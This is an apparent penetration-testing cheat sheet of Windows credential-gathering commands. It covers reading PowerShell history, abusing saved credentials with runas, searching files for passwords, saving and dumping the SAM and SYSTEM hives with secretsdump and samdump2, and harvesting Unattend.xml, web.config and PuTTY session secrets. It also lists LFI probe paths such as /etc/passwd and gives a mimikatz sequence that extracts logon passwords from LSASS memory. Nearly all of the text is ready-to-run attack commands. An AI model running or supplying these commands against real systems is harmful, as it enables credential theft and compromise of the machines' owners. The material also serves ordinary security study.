

```powershell 

##########Credential Gethering 
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

#saved creds
cmdkey /list

runas /savecred /user:admin cmd.exe

# Search for Passwords in Files
findstr /si password *.txt *.xml *.ini *.config *.cfg

## Dump SAM & SYSTEM

reg save hklm\sam sam.hive  
reg save hklm\system system.hive

Get-History 

#history path
(Get-PSReadLineOption).HistorySavePath

#used to keep track of execute commands
Start-Transcript  -Path "C:\Users\USER\Desktop\Log.txt"

```


> SSH Keys
```powershell
/Users/Administrator/.ssh/id_rsa
```

>LFI detection
```powershell
/Windows/System32/Drivers/etc/hosts
/Windows/system.ini

/etc/passwd
```

>  Enumerate vaults
```powershell
vaultcmd /list
```


>SAM and SYSTEM location
```powershell

C:\Windows\system32\config\sam
C:\Windows\system32\sam

#Dumping Hashes from SYSTEM and  SAM
impacket-secretsdump -sam ./SAM -system ./SYSTEM LOCAL

# the order is important 
samdump2 SYSTEM SAM 
```



**Credential Gathering Common locations** 
```powershell
C:\Unattend.xml  
C:\Windows\Panther\Unattend.xml  
C:\Windows\Panther\Unattend\Unattend.xml  
C:\Windows\system32\sysprep.inf  
C:\Windows\system32\sysprep\sysprep.xml

# Common Locations
C:\inetpub\wwwroot\web.config  
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# Search for Database Strings
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

# Enumerate Stored Sessions
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s


```


Cached AD credentials:
In modern versions of Windows, these hashes are stored in the _Local Security Authority Subsystem Service_(LSASS) memory space. LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```